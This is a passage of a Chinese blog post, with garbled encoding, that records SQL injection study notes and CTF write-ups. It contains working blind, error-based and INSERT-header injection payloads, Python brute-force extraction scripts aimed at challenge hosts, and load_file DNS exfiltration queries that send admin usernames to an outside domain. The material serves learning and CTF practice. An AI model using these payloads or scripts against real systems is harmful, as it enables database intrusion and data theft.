<h3 id="4-ä¸€èˆ¬æ“ä½œ"><a href="#4-ä¸€èˆ¬æ“ä½œ" class="headerlink" title="4.ä¸€èˆ¬æ“ä½œ"></a>4.ä¸€èˆ¬æ“ä½œ</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema; //è¿›å…¥ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'myclass'</span>; //æœç´¢å½“æ•°æ®åº“åä¸ºmyclassä¸­å„è¡¨çš„åå­—</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png" alt="image-20200502160256194"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; //çŒœæ•°æ®åº“</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'æ•°æ®åº“å'</span>; //çŒœæŸåº“çš„æ•°æ®è¡¨</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">form</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'è¡¨å'</span>; //çŒœæŸè¡¨çš„æ•°æ®æ®µ</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> *; //çŒœæ•°æ®æ®µçš„å†…å®¹</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png" alt="image-20200502161927164_WPSå›¾ç‰‡"></p>
<h2 id="3-ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰"><a href="#3-ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰" class="headerlink" title="3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰"></a>3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰</h2><h3 id="1-åŸºäºå¸ƒå°”çš„SQLç›²æ³¨"><a href="#1-åŸºäºå¸ƒå°”çš„SQLç›²æ³¨" class="headerlink" title="1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨"></a>1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨</h3><h3 id="2-åŸºäºæ—¶é—´çš„SQLç›²æ³¨"><a href="#2-åŸºäºæ—¶é—´çš„SQLç›²æ³¨" class="headerlink" title="2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨"></a>2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨</h3><p>æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨éå¸¸ç±»ä¼¼ï¼Œä½†æ—¶é—´ç›²æ³¨æ˜¯åˆ©ç”¨sleep()â€‹å’Œbenchmark()ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œçš„æ—¶é—´å˜é•¿ã€‚</p>
<p>æ—¶é—´ç›²æ³¨å¤šä¸IF(expr1,expr2,expr3)ç»“åˆä½¿ç”¨ï¼Œå¦‚æœexpr1æ˜¯trueï¼Œåˆ™æ‰§è¡Œexpr2ï¼Œå¦åˆ™æ‰§è¡Œexpr3</p>
<h3 id="INSERT-INTOæ³¨å…¥-caseå»¶æ—¶ç›²æ³¨"><a href="#INSERT-INTOæ³¨å…¥-caseå»¶æ—¶ç›²æ³¨" class="headerlink" title="INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)"></a>INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)</h3><p>çœ‹äº†æºç çŸ¥é“å–xffå¤´,å¹¶ä¸”explodeè¿‡æ»¤é€—å·ã€‚é¢˜ç›®çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;è·å–è¯·æ±‚çš„ipåœ°å€</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;å°†é€—å·è¿‡æ»¤</span><br><span class="line">return $ip_arr[0]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜æ˜¯<strong>ç›²æ³¨</strong>é¢˜ç›®è¯´å¾—ä¹Ÿå¾ˆæ˜ç™½ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆæ³¨å…¥å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜</p>
<ul>
<li>ç¬¬ä¸€ä¸ªæ˜¯ç†è§£<code>insert...into</code>æ³¨å…¥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class="line">&#x2F;&#x2F;è¿™é‡Œä¸»è¦ç»“åˆsleep()è¿›è¡Œæ³¨å…¥</span><br><span class="line">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class="line">&#x2F;&#x2F;è¿™æ ·å°±æ’å…¥äº†ä¸€æ¡id&#x3D;1,name&#x3D;nullçš„æ•°æ®</span><br></pre></td></tr></table></figure>
<ul>
<li>ç¬¬äºŒä¸ªæ˜¯è¿‡æ»¤é€—å·çš„ï¼Œ<strong>æ‰€ä»¥ä¸èƒ½ç”¨<code>if(a,b,c)</code>åº”è¯¥ç”¨<code>case...when...then</code>åŒæ—¶å¸¸ç”¨çš„æˆªå–å­—ç¬¦ä¸²å‡½æ•°<code>substr([str],[start],[len])</code>ä¹Ÿæœ‰æ›¿ä»£çš„<code>substr([str]from [strat] for [len])</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case...when...then</span><br><span class="line">ç®€å•caseå‡½æ•°</span><br><span class="line">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class="line">				when &#39;2&#39; then &#39;nv&#39;</span><br><span class="line">				else &#39;qita&#39; end</span><br><span class="line">caseæœç´¢å‡½æ•°</span><br><span class="line">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class="line">		 when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class="line">		 else &#39;qita&#39; end</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥åªéœ€è¦æ„é€ å°±å¯ä»¥äº†ã€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class="line">&#x2F;&#x2F;æœ€åä¸€ä¸ª)ç”¨æ¥é—­åˆ #ç”¨æ¥æ³¨é‡Š</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥å†™è„šæœ¬äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url = url,headers = headers,timeout = <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag is :&#123;"</span> +flag+<span class="string">"&#125;"</span>)</span><br><span class="line">//æ•°æ®åº“</span><br><span class="line">payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">åº“ä¸ºweb15</span><br><span class="line">//è¡¨</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">è¡¨ä¸ºclient_ip,flag</span><br><span class="line">//åˆ—</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">flag</span><br><span class="line">//flag</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p>
<blockquote>
<p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p>
</blockquote>
<h3 id="å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰"></a>å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰</h3><p>ä¸»è¦å­¦ä¹ ä¸€ä¸‹<strong>å¼‚æˆ–æ³¨å…¥</strong>åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å…³é”®è¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¼‚æˆ–ï¼š1^1&#x3D;0ï¼Œ1^0&#x3D;1ï¼Œ0^1&#x3D;1ï¼Œ0^0&#x3D;0</span><br><span class="line">è¿™æ ·å½“æ„é€ ï¼š?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class="line">è‹¥è¿”å›æ­£ç¡®é¡µé¢çš„å›æ˜¾(There is nothing.)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºå‡;</span><br><span class="line">è‹¥è¿”å›é”™è¯¯é¡µé¢çš„å›æ˜¾(Error,Error,Error!)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+å‡å›æ˜¾äº†Error,Error,Error!ï¼Œè¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸï¼Œé‚£ä¹ˆå¯åˆ¤æ–­andè¢«è¿‡æ»¤äº†</span><br><span class="line">åŒç†å¯åˆ¤æ–­orã€selectã€unionä¹Ÿè¢«è¿‡æ»¤äº†</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„çš„æ˜¯ï¼šinformationä¸­ä¹Ÿæœ‰or</p>
<p>ç»§ç»­å­¦ä¹ ç›²æ³¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;Nobody&#39; not in r.text:</span><br><span class="line">            data +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶äº†è§£ä¸€ä¸‹æŠ¥é”™æ³¨å…¥</p>
<p>å¥½åƒæ³¨å…¥çš„æ—¶å€™æ˜¯ä¸éœ€è¦selectçš„ï¼Œä½†åœ¨mysqlä¸­æ˜¯éœ€è¦çš„</p>
<p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png" alt="image-20200816164858101"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure>
<h3 id="ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰"></a>ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰</h3><p>æ ¹æ®é¢˜ç›®å¯çŸ¥ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(a,b,c) aå¯¹å°±æ‰§è¡Œbï¼Œå¦åˆ™å°±æ‰§è¡Œc</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªé¢˜ç›®æ­£å¥½æ˜¯id=1,2ä¼šå¯¹ï¼Œ3å°±é”™æ‰€ä»¥æˆ‘ä»¬æŠŠb=1æˆ–2ï¼Œcä¸º3</p>
<p>æ¥ä¸‹æ¥å†™è„šæœ¬å°±å¯ä»¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;query_success&#39; in r.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#è¡¨</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class="line">#åˆ—</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡ä¸­é—´å¥½åƒæ˜¯æœåŠ¡å™¨ä¼šå…³é—­æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†ç»„æ‰«æ</p>
<p>æ¯”å¦‚ä»1-30ï¼Œ30-50</p>
<h3 id="ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰"><a href="#ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰" class="headerlink" title="ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰"></a>ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰</h3><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ç›´æ¥å†™è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#è¡¨</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#åˆ—</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure>
<h3 id="3-åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"><a href="#3-åŸºäºæŠ¥é”™çš„SQLç›²æ³¨" class="headerlink" title="3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"></a>3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' and updataxml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //æŸ¥çœ‹ç”¨æˆ·</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //æŸ¥çœ‹æ•°æ®åº“</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updataxml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+    //æŸ¥çœ‹æ•°æ®åº“çš„åå­—</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class="keyword">test</span> <span class="string">' limit 0,1),0x7e),1) --+     //æŸ¥çœ‹å„è¡¨çš„åå­—</span></span><br><span class="line"><span class="string">'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'my student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //æŸ¥çœ‹åˆ—çš„åå­—</span></span><br></pre></td></tr></table></figure>
<h2 id="4-äºŒæ¬¡æ³¨å…¥"><a href="#4-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="4.äºŒæ¬¡æ³¨å…¥"></a>4.äºŒæ¬¡æ³¨å…¥</h2><h3 id="0x01äºŒæ¬¡æ³¨å…¥åŸç†"><a href="#0x01äºŒæ¬¡æ³¨å…¥åŸç†" class="headerlink" title="0x01äºŒæ¬¡æ³¨å…¥åŸç†"></a>0x01äºŒæ¬¡æ³¨å…¥åŸç†</h3><p><strong>é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</strong></p>
<ul>
<li><p>ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®<br>è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚</p>
</li>
<li><p>ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®<br>å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚</p>
</li>
</ul>
<h2 id="5-DNSæ³¨å…¥"><a href="#5-DNSæ³¨å…¥" class="headerlink" title="5.DNSæ³¨å…¥"></a>5.DNSæ³¨å…¥</h2><h3 id="0x01DNS"><a href="#0x01DNS" class="headerlink" title="0x01DNS"></a>0x01DNS</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png" alt="image-20200609202338069"></p>
<h3 id="0x02æ³¨å…¥å‡½æ•°"><a href="#0x02æ³¨å…¥å‡½æ•°" class="headerlink" title="0x02æ³¨å…¥å‡½æ•°"></a>0x02æ³¨å…¥å‡½æ•°</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png" alt="image-20200609203639074"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;è¯»å–æ–‡ä»¶</span><br><span class="line">select load_file(&quot;\\\\xxx.php90.cn\\ccc&quot;)      &#x2F;&#x2F;è½¬ä¹‰</span><br></pre></td></tr></table></figure>
<h3 id="0x03æ³¨å…¥"><a href="#0x03æ³¨å…¥" class="headerlink" title="0x03æ³¨å…¥"></a>0x03æ³¨å…¥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,(select database()),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\cc&quot;));</span><br></pre></td></tr></table></figure>
<h2 id="6-æŠ¥é”™æ³¨å…¥"><a href="#6-æŠ¥é”™æ³¨å…¥" class="headerlink" title="6.æŠ¥é”™æ³¨å…¥"></a>6.æŠ¥é”™æ³¨å…¥</h2><p>æ›´è¯¦ç»†çš„è§£é‡Š<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>
<p>æŠ¥é”™æ³¨å…¥åœ¨æ²¡æ³•ç”¨unionè”åˆæŸ¥è¯¢æ—¶ç”¨ï¼Œä½†å‰æè¿˜æ˜¯ä¸èƒ½è¿‡æ»¤ä¸€äº›å…³é”®çš„å‡½æ•°ã€‚</p>
<p>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹<code>xpathè¯­æ³•é”™è¯¯</code>å’Œ<code>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</code></p>
<h3 id="xpathè¯­æ³•é”™è¯¯"><a href="#xpathè¯­æ³•é”™è¯¯" class="headerlink" title="xpathè¯­æ³•é”™è¯¯"></a>xpathè¯­æ³•é”™è¯¯</h3><p>åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°ã€‚<br>ä½¿ç”¨æ¡ä»¶ï¼šmysqlç‰ˆæœ¬&gt;5.1.5</p>
<p><strong>extractvalueå‡½æ•°</strong></p>
<blockquote>
